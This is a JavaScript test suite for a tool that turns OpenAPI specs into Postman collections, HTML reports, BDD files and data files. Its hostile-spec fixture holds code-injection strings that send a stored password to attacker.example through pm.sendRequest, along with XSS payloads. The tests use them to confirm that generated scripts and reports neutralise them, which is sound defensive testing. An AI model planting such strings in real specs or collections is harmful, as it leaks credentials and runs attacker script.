import { test } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { OpenAPIParser } from '../src/parsers/openapi-parser.js';
import { PositiveTestGenerator } from '../src/generators/positive-generator.js';
import { NegativeTestGenerator } from '../src/generators/negative-generator.js';
import { HTMLReportGenerator } from '../src/generators/html-report-generator.js';
import { TechSpecGenerator } from '../src/generators/tech-spec-generator.js';
import { DataFileGenerator } from '../src/generators/data-file-generator.js';
import { BDDGenerator } from '../src/generators/bdd-generator.js';
import { ScriptChecker } from '../src/validators/script-checker.js';
import { CoverageChecker } from '../src/validators/coverage-checker.js';
import { toJsonSchema, generateExample } from '../src/core/schema.js';
import { BOOKER_SPEC, tempDir, writeJson, requestItems, scriptOf } from './helpers.js';

const parse = file => new OpenAPIParser().parse(file);

const EVIL_PROP = "x'); pm.sendRequest('https://attacker.example/?k=' + pm.environment.get('password')); ('";
const EVIL_PROP_2 = 'y"); pm.sendRequest("https://attacker.example/2"); ("`${pm.sendRequest("https://attacker.example/3")}`\\';

async function hostileSpec() {
  const dir = await tempDir();
  return writeJson(path.join(dir, 'hostile.json'), {
    openapi: '3.0.0',
    info: { title: 'Evil <img src=x onerror=alert(document.cookie)>', version: '1', description: '<script>alert(1)</script>' },
    servers: [{ url: 'http://localhost' }],
    components: { securitySchemes: { ApiKeyAuth: { type: 'apiKey', in: 'header', name: 'X-API-Key' } } },
    security: [{ ApiKeyAuth: [] }],
    paths: {
      "/items/{id}'); pm.sendRequest('https://attacker.example/path'); ('": {
        get: {
          summary: "<script>alert(1)</script>'); pm.sendRequest('https://attacker.example/summary'); ('",
          parameters: [{ name: 'id', in: 'path', required: true, schema: { type: 'string' } }],
          responses: { 200: { description: 'ok', content: { 'application/json': { schema: {
            type: 'object', properties: { [EVIL_PROP]: { type: 'string' }, [EVIL_PROP_2]: { type: 'string' } },
          } } } } },
        },
      },
      '/items': {
        post: {
          requestBody: { content: { 'application/json': { schema: { type: 'object', required: [EVIL_PROP], properties: { [EVIL_PROP]: { type: 'string' } } } } } },
          responses: { 201: { description: 'ok', content: { 'application/json': { schema: { type: 'object', properties: { id: { type: 'string' } } } } } } },
        },
      },
      '/public': { post: {
        security: [],
        requestBody: { content: { 'application/json': { schema: { type: 'object', properties: { n: { type: 'string' } } } } } },
        responses: { 200: { description: 'ok' }, 400: { description: 'bad' } },
      } },
    },
  });
}

/** Execute a generated script against a stub `pm` and report any pm.sendRequest calls. */
function runScript(script) {
  const sent = [];
  const chain = new Proxy(function stub() {}, { get: (t, key) => (key === 'then' ? undefined : chain), apply: () => chain });
  const store = () => { const m = new Map(); return { get: k => m.get(k), set: (k, v) => m.set(k, v), unset: k => m.delete(k), has: k => m.has(k), toObject: () => Object.fromEntries(m) }; };
  const pm = {
    test: (name, fn) => { try { fn(); } catch { /* assertion stubs */ } },
    expect: () => chain,
    response: {
      code: 200, responseTime: 1, to: chain,
      json: () => ({ id: '1' }), text: () => '{"id":"1"}',
      headers: { get: () => 'application/json', has: () => false, each: () => {} },
    },
    collectionVariables: store(), environment: store(), variables: store(), globals: store(),
    iterationData: { toObject: () => ({}) },
    execution: { skipRequest: () => {} },
    sendRequest: (...args) => sent.push(args),
  };
  const quiet = { log() {}, warn() {}, error() {} };
  new Function('pm', 'console', script)(pm, quiet);
  return sent;
}

test('spec content cannot inject code into generated scripts', async () => {
  const spec = await parse(await hostileSpec());
  const collections = [new PositiveTestGenerator(spec).generate(), new NegativeTestGenerator(spec).generate()];
  let scripts = 0;
  for (const collection of collections) {
    for (const item of requestItems(collection)) {
      for (const listen of ['prerequest', 'test']) {
        const script = scriptOf(item, listen);
        if (!script) continue;
        scripts++;
        assert.deepEqual(runScript(script), [], `pm.sendRequest executed from ${item.name}`);
      }
    }
    const check = new ScriptChecker().checkCollection(collection, 'x');
    assert.equal(check.errors.length, 0);
    assert.equal(check.warnings.length, 0, JSON.stringify(check.warnings));
  }
  assert.ok(scripts > 5);
});

test('ScriptChecker warns about pm.sendRequest in third-party collections', () => {
  const collection = { item: [{ name: 'r', request: {}, event: [{ listen: 'test', script: { exec: ['pm.sendRequest("https://x")'] } }] }] };
  const result = new ScriptChecker().check(collection, { item: [] });
  assert.equal(result.valid, 1);
  assert.match(result.warnings[0].warning, /pm\.sendRequest/);

  const hidden = { item: [{ name: 'r', request: {}, event: [{ listen: 'test', script: { exec: ['const a = `${pm.sendRequest("https://x")}`;'] } }] }] };
  assert.equal(new ScriptChecker().check(hidden, { item: [] }).warnings.length, 1, 'calls inside template literals are flagged');
  const inString = { item: [{ name: 'r', request: {}, event: [{ listen: 'test', script: { exec: ['pm.test("pm.sendRequest(x)", function () {});'] } }] }] };
  assert.equal(new ScriptChecker().check(inString, { item: [] }).warnings.length, 0, 'text inside plain strings is not flagged');
});

test('HTML report escapes spec content', async () => {
  const spec = await parse(await hostileSpec());
  const html = HTMLReportGenerator.generate(spec, new PositiveTestGenerator(spec).generate(), new NegativeTestGenerator(spec).generate());
  assert.ok(!html.includes('<img src=x'), 'raw <img> from the title');
  assert.ok(!html.includes('<script>alert(1)</script>'), 'raw <script> from summary/description');
  assert.ok(html.includes('&lt;img src=x onerror=alert(document.cookie)&gt;'));
});

test('auth header uses the scheme parameter name; public endpoints get no credentials and no no-auth test', async () => {
  const spec = await parse(await hostileSpec());
  const positive = requestItems(new PositiveTestGenerator(spec).generate());
  const privateItem = positive.find(i => i.request.method === 'POST' && i.request.url.raw.endsWith('/items'));
  assert.deepEqual(privateItem.request.header.find(h => h.key === 'X-API-Key'), { key: 'X-API-Key', value: '{{apiKey}}', type: 'text' });
  assert.ok(!privateItem.request.header.some(h => h.key === 'ApiKeyAuth'));
  const publicItem = positive.find(i => i.request.url.raw.endsWith('/public'));
  assert.ok(!publicItem.request.header.some(h => h.key === 'X-API-Key'));

  const negative = requestItems(new NegativeTestGenerator(spec).generate());
  assert.ok(!negative.some(i => i.request.url.raw.endsWith('/public') && i.name.includes('no credentials')));
  const noAuth = negative.find(i => i.name.includes('POST /items - no credentials'));
  assert.ok(noAuth, 'private endpoint gets a no-auth test');
  assert.ok(!noAuth.request.header.some(h => h.key === 'X-API-Key'));
  assert.deepEqual(noAuth.protocolProfileBehavior, { disableCookies: true });
});

test('restful-booker: contract checks on every documented JSON response and field-level negative tests', async () => {
  const spec = await parse(BOOKER_SPEC);
  const positive = requestItems(new PositiveTestGenerator(spec).generate());
  const withJsonResponse = spec.endpoints.filter(e => Object.entries(e.responses).some(([c, r]) => /^2/.test(c) && r.schema));
  for (const endpoint of withJsonResponse) {
    const name = endpoint.path === '/auth' ? 'Authenticate' : `${endpoint.method} ${endpoint.path}`;
    const item = positive.find(i => i.request.method === endpoint.method && i.name.startsWith(name));
    assert.match(scriptOf(item), /to\.have\.jsonSchema/, `${endpoint.key} has a schema check`);
  }

  const negativeGen = new NegativeTestGenerator(spec);
  const negative = requestItems(negativeGen.generate()).map(i => i.name);
  for (const field of ['firstname', 'lastname', 'totalprice', 'depositpaid', 'bookingdates']) {
    assert.ok(negative.includes(`[NEG] POST /booking - missing required field "${field}"`), field);
  }
  assert.ok(negative.includes('[NEG] POST /booking - "totalprice" has the wrong type (integer expected)'));
  assert.ok(!negative.some(n => n.includes('is an empty string')), 'no empty-string tests where the spec allows ""');
  assert.ok(!negative.some(n => n.startsWith('[NEG] POST /booking - no credentials')), 'POST /booking is public');
  assert.ok(negative.includes('[NEG] DELETE /booking/{id} - no credentials'), 'DELETE documents 403');
  assert.deepEqual(negativeGen.specGaps.map(g => g.operation).sort(), ['PATCH /booking/{id}', 'PUT /booking/{id}']);
});

test('update and delete only target resources created by the run', async () => {
  const spec = await parse(BOOKER_SPEC);
  const positive = requestItems(new PositiveTestGenerator(spec).generate());
  for (const method of ['PUT', 'PATCH', 'DELETE']) {
    const item = positive.find(i => i.request.method === method);
    assert.equal(item.request.url.raw, '{{baseUrl}}/booking/{{booking_id}}');
    assert.match(scriptOf(item, 'prerequest'), /__created/);
  }
  const create = positive.find(i => i.request.method === 'POST' && i.request.url.raw === '{{baseUrl}}/booking');
  assert.match(scriptOf(create), /"bookingid"/, 'id key derived from the response schema');
});

test('optional query parameters are disabled so they cannot narrow results', async () => {
  const spec = await parse(BOOKER_SPEC);
  const list = requestItems(new PositiveTestGenerator(spec).generate()).find(i => i.request.method === 'GET' && i.request.url.raw.startsWith('{{baseUrl}}/booking') && !i.request.url.raw.includes('{{booking_id}}'));
  assert.equal(list.request.url.raw, '{{baseUrl}}/booking');
  assert.ok(list.request.url.query.every(q => q.disabled === true));
});

test('coverage maps negative requests back to their operations', async () => {
  const spec = await parse(BOOKER_SPEC);
  const result = new CoverageChecker().check(spec, new PositiveTestGenerator(spec).generate(), new NegativeTestGenerator(spec).generate());
  assert.equal(result.positivePercent, 100);
  assert.equal(result.negativePercent, 100);
  assert.deepEqual(result.uncoveredNegative, []);
});

test('BDD scenarios and Postman tests agree on success codes', async () => {
  const spec = await parse(BOOKER_SPEC);
  const feature = new BDDGenerator(spec).generateSingleFile();
  assert.ok(!/Feature: Auth\b/.test(feature), 'auth endpoint is not a feature');
  const positive = requestItems(new PositiveTestGenerator(spec).generate());
  let compared = 0;
  for (const [, method, route, codes] of feature.matchAll(/Scenario: Successfully .*? \((\w+) (\S+)\)\n(?:.*\n)*?\s+Then the response status code should be (.+)/g)) {
    const item = positive.find(i => i.name.startsWith(`${method} ${route}`));
    const expected = scriptOf(item).split('\n').find(l => l.startsWith('// expected-status:')).slice('// expected-status:'.length).trim();
    assert.equal(codes.trim(), expected, `${method} ${route}`);
    compared++;
  }
  assert.equal(compared, spec.endpoints.length - 1); // every operation except POST /auth
  for (const scenario of feature.split(/\n\s*@/).filter(s => s.includes('Given I am not authenticated'))) {
    assert.ok(!scenario.includes('Given I am authenticated'), 'no-auth scenarios must not authenticate');
  }
});

test('tech spec documents the real API-key header name', async () => {
  const spec = await parse(await hostileSpec());
  const markdown = new TechSpecGenerator(spec).generate();
  assert.match(markdown, /X-API-Key: <api-key>/);
  assert.doesNotMatch(markdown, /Standard Error Response/);
});

test('CSV data files start with the header row and round-trip typed values', async () => {
  const dir = await tempDir();
  const file = await writeJson(path.join(dir, 'tags.json'), {
    openapi: '3.0.0', info: { title: 'Tags', version: '1' },
    paths: { '/things': { post: {
      requestBody: { content: { 'application/json': { schema: { type: 'object', properties: {
        name: { type: 'string', maxLength: 8 },
        code: { type: 'string', pattern: '^[A-Z]{3}-\\d{2}$' },
        tags: { type: 'array', items: { type: 'string' } },
        count: { type: 'integer', minimum: 5, maximum: 6 },
      } } } } },
      responses: { 201: { description: 'ok' } },
    } } },
  });
  const spec = await parse(file);
  const generator = new DataFileGenerator(spec, { rowCount: 4 });
  const rows = generator.generate();
  const csv = generator.toCSV(rows).split('\n');
  assert.equal(csv[0], 'name,code,tags,count');
  assert.ok(!csv.some(line => line.startsWith('#')));
  for (const row of rows) {
    assert.ok(row.name.length <= 8, row.name);
    assert.match(row.code, /^[A-Z]{3}-\d{2}$/);
    assert.ok(row.count >= 5 && row.count <= 6, String(row.count));
    assert.ok(Array.isArray(row.tags));
  }
  assert.ok(!csv.join('\n').includes('PATTERN:'));
});

test('data files exclude path parameters (ids come from the request chain)', async () => {
  const spec = await parse(BOOKER_SPEC);
  const rows = new DataFileGenerator(spec).generate();
  assert.ok(!('id' in rows[0]));
  assert.ok(!('username' in rows[0]), 'auth request is not data-driven');
  assert.ok('bookingdates.checkin' in rows[0]);
});

test('toJsonSchema produces Ajv 6 compatible schemas', () => {
  const node = { type: 'object', nullable: true, properties: {
    count: { type: 'integer', format: 'int32', minimum: 0, exclusiveMinimum: true },
    id: { type: 'string', format: 'uuid', example: 'x', readOnly: true },
    secret: { type: 'string', writeOnly: true },
  }, required: ['count', 'secret'] };
  node.properties.self = node;
  const schema = toJsonSchema(node);
  assert.deepEqual(schema.type, ['object', 'null']);
  assert.deepEqual(schema.properties.count, { type: 'integer', exclusiveMinimum: 0 });
  assert.deepEqual(schema.properties.id, { type: 'string', format: 'uuid' });
  assert.equal(schema.properties.secret, undefined);
  assert.deepEqual(schema.required, ['count']);
  assert.deepEqual(schema.properties.self, {});
});

test('generateExample gives sibling properties sharing a schema object their own values', () => {
  const shared = { type: 'string', format: 'date' };
  const example = generateExample({ type: 'object', properties: { start: shared, end: shared } });
  assert.deepEqual(example, { start: '2030-01-15', end: '2030-01-15' });
});
